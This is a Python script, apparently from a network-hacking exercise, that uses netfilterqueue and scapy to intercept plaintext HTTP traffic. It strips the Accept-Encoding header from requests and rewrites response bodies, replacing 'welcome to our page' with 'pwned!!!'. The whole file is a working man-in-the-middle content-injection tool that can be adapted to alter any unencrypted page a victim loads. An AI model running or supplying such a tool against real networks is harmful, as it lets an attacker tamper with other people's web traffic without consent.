#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
import sys
import re

def def_handler(signal, frame):
    print("\n[!] Closing program...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Convert the packet to a scapy packet (IP)
    
    if scapy_packet.haslayer(scapy.Raw):
        try:
            
            load = scapy_packet[scapy.Raw].load
            if scapy_packet.haslayer(scapy.TCP):
                
                if scapy_packet[scapy.TCP].dport == 80:
                    #avoid error utf-8
                    m_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
                    new_packet = set_load(scapy_packet, m_load)
                    packet.set_payload(new_packet.build()) # Set the modified packet as the payload
                    
                elif scapy_packet[scapy.TCP].sport == 80:
                    m_load = scapy_packet[scapy.Raw].load.replace(b"welcome to our page", b"pwned!!!")
                    new_packet = set_load(scapy_packet, m_load)
                    packet.set_payload(new_packet.build())
        except:
            pass
    packet.accept()  
    
    
def main():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == '__main__':
    main()